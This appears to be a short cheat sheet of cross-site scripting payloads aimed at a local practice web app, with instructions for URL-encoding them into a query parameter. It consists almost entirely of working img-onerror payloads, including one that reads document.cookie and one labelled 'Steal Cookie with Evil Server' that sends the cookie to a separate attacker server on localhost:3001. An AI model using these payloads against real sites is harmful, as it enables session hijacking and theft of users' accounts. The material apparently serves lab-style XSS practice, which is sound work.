Note: use DevTools console "EncodeURIComponent" function to pass payloads as URI query parameters

Basic XSS Alert
<img src="does-not-exist" onerror="alert(\'hi!\')">

encodeURIComponent('<img src="does-not-exist" onerror="alert(\'hi!\')">');
Encoded format: "%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert('hi!')%22%3E"
Pass output of above as URI query parameter^
Example: http://localhost:3000/?q=%22%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(%27hi!%27)%22%3E%22

View Cookie
<img src="does-not-exist" onerror="alert(document.cookie)">
Encoded format: '%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(document.cookie)%22%3E'


Steal Cookie with Evil Server
<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie;">
Encoded format: "%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement('img')%3B%20img.src%20%3D%20'http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D'%20%2B%20document.cookie%3B%22%3E"
